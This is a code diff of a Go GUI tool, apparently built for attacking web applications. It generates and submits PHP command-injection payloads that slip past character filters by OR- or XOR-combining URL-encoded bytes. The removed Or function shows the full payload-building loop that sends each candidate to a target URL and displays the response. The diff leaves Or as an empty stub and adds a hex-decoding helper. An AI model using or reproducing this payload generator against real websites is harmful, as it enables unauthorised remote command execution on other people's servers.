@@ -2,13 +2,13 @@ package script
 
 import (
 	"bytes"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"log"
 	"mime/multipart"
 	"net/http"
 	"net/url"
-	"regexp"
 	"strings"
 	"time"
 
@@ -288,93 +288,14 @@ func Xor(URL string, command string, v string, canshu string, label *widget.Labe
 	label.SetText("URL为: " + newURL + "payload为: " + payload + "回显为: " + bodya)
 }
 
+// hexToString 函数用于将十六进制转换为字符串
+func hexToString(hexStr string) string {
+	bytes, _ := hex.DecodeString(hexStr)
+	return string(bytes)
+}
+
 func Or(URL string, command string, canshu string, label *widget.Label, guolv string, leixing string) {
 
-	var char string
-	for i := 0; i <= 0xFF; i++ {
-		//对0x00到0xff进行遍历
-		cha := byte(i) // 将整数转换为 byte 类型
-		encoded := url.QueryEscape(string(cha))
-		matches, _ := regexp.MatchString(url.QueryEscape(guolv), encoded)
-
-		if matches == false {
-			decoded, _ := url.QueryUnescape(encoded)
-			char += decoded
-		}
-
-	}
-
-	var c1 string
-	var c2 string
-
-	leftIndex := strings.Index(command, "(")
-	if leftIndex == -1 {
-		// 字符串中没有左括号
-		c1 = command
-		c2 = ""
-		label.SetText("字符串中没有左括号")
-	}
-
-	// 查找第一个右括号的索引
-	rightIndex := strings.Index(command, ")")
-	if rightIndex == -1 {
-		// 字符串中没有右括号
-		c1 = ""
-		c2 = ""
-		label.SetText("字符串中没有右括号")
-	}
-
-	if leftIndex < rightIndex {
-		// 括号正确匹配，提取括号内外的内容
-		//c1是括号外内容，c2是括号内内容
-		c1 = command[:leftIndex]
-		c2 = command[leftIndex+1 : rightIndex]
-
-	} else {
-		// 括号不正确匹配
-		c1 = command
-		c2 = ""
-		label.SetText("括号不正确匹配")
-	}
-
-	var c, d, e, f string
-
-	for _, a := range char {
-		for _, b := range char {
-
-			for _, dan := range c1 {
-				if string(a|b) == string(dan) {
-					a1 := url.QueryEscape(string(a))
-					b1 := url.QueryEscape(string(b))
-					c += a1
-					d += b1
-					continue
-				}
-			}
-
-			for _, dan := range c2 {
-				if string(a|b) == string(dan) {
-					a1 := url.QueryEscape(string(a))
-					b1 := url.QueryEscape(string(b))
-					e += a1
-					f += b1
-					continue
-				}
-			}
-
-			payload1 := "(\"" + c + "\"|\"" + d + "\")"
-			payload2 := "\"" + e + "\"|\"" + f + "\""
-
-			if e == "" || f == "" {
-				payload2 = ""
-			}
-
-			payload := payload1 + "(" + payload2 + ")"
-
-			result := GP(URL, canshu, leixing, payload)
-			label.SetText(result)
-		}
-	}
 }
 
 func Noshuzievaljinjie(url string, command string, v string, i string, m string, guolv string, label *widget.Label) {
